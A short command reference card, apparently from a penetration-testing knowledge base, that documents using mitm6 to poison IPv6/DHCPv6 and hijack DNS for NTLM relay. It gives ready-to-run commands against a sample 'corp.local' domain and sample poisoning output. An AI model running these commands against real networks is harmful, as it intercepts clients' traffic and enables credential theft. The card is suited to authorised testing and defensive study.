---
type: command
executor: bash
data: mitm6 -i $_INTERFACE -d $_DOMAIN
output: null
platforms:
  - Linux
tags:
  - ipv6
  - dns
  - poisoning
verified: true
validated: true
---

# mitm6-ipv6-dns-takeover

## Command

```bash
mitm6 -i $_INTERFACE -d $_DOMAIN
```

## Description

This command runs Mitm6 to perform IPv6-based network poisoning, sending forged router advertisements and DHCPv6 responses to hijack DNS resolution for a specific domain, enabling WPAD spoofing for NTLM relay attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_INTERFACE | Network interface to listen on (e.g., eth0) | Yes |
| -d $_DOMAIN | Target domain to filter poisoning requests (e.g., example.com) | Yes |

## Examples

### Basic Usage

```bash
mitm6 -i eth0 -d corp.local
```

### Advanced Usage

```bash
mitm6 -i eth0 -d corp.local --whitelist-ips 192.168.1.1
```

## Expected Output

Output shows poisoning events:

[*] Sending RA for fe80::a00:27ff:fe12:3456
[*] Sending DHCPv6 Advertise for fe80::a00:27ff:fe12:3456
[*] Client aa:bb:cc:dd:ee:ff requested domain corp.local

Successful takeover indicated by client requests to attacker's services.

## Related

- [[procedures/SMB-NTLM-Relay-Attack-via-IPv6-with-Disabled-Signing]]
- [[tools/Mitm6]]
